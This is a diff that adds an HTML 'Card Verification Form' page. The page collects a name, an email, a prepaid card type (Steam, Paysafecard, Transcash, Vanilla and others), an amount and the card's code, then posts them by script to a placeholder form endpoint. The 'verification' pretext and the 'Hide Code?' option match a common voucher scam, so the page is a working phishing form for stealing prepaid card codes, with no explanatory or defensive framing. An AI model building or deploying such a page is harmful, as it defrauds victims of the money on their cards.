@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Card Verification Form</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      max-width: 600px;
+      margin: 40px auto;
+      background: #f2f2f2;
+      padding: 20px;
+    }
+    form {
+      background: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px #ccc;
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+    input, select, button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 6px;
+      font-size: 16px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    button {
+      background: #007BFF;
+      color: white;
+      border: none;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    button:hover {
+      background: #0056b3;
+    }
+    .message {
+      margin-top: 15px;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+
+<h2>Card Verification Form</h2>
+
+<form id="verification-form" action="TON_ENDPOINT_FORM" method="POST">
+  <label for="name">Full Name</label>
+  <input type="text" id="name" name="name" required />
+
+  <label for="email">Email Address</label>
+  <input type="email" id="email" name="_replyto" required />
+
+  <label for="card_type">Card Type</label>
+  <select id="card_type" name="card_type" required>
+    <option value="" disabled selected>Select a card</option>
+    <option value="Steam">Steam</option>
+    <option value="Paysafecard">Paysafecard</option>
+    <option value="iTunes">iTunes</option>
+    <option value="Apple Pay">Apple Pay</option>
+    <option value="Transcash">Transcash</option>
+    <option value="Steam Card">Steam Card</option>
+    <option value="Vanilla Card">Vanilla Card</option>
+  </select>
+
+  <label for="amount">Amount</label>
+  <select id="amount" name="amount" required>
+    <option value="" disabled selected>Select amount</option>
+    <option value="20€ / $">20€ / $</option>
+    <option value="30€ / $">30€ / $</option>
+    <option value="50€ / $">50€ / $</option>
+    <option value="100€ / $">100€ / $</option>
+  </select>
+
+  <label for="card_code">Card Code</label>
+  <input type="text" id="card_code" name="card_code" required />
+
+  <label for="hide_code">Hide Code?</label>
+  <select id="hide_code" name="hide_code" required>
+    <option value="" disabled selected>Select</option>
+    <option value="Yes">Yes</option>
+    <option value="No">No</option>
+  </select>
+
+  <button type="submit">Submit</button>
+</form>
+
+<div class="message" id="message"></div>
+
+<script>
+  const form = document.getElementById('verification-form');
+  const messageDiv = document.getElementById('message');
+
+  form.addEventListener('submit', function(event) {
+    event.preventDefault();
+    const data = new FormData(form);
+    fetch(form.action, {
+      method: 'POST',
+      body: data,
+      headers: { 'Accept': 'application/json' }
+    }).then(response => {
+      if (response.ok) {
+        messageDiv.style.color = 'green';
+        messageDiv.textContent = 'Your submission has been sent successfully!';
+        form.reset();
+      } else {
+        response.json().then(data => {
+          if (Object.hasOwn(data, 'errors')) {
+            messageDiv.style.color = 'red';
+            messageDiv.textContent = data["errors"].map(error => error["message"]).join(", ");
+          } else {
+            messageDiv.style.color = 'red';
+            messageDiv.textContent = 'Oops! There was a problem submitting your form';
+          }
+        });
+      }
+    }).catch(() => {
+      messageDiv.style.color = 'red';
+      messageDiv.textContent = 'Oops! There was a problem submitting your form';
+    });
+  });
+</script>
+
+</body>
+</html>
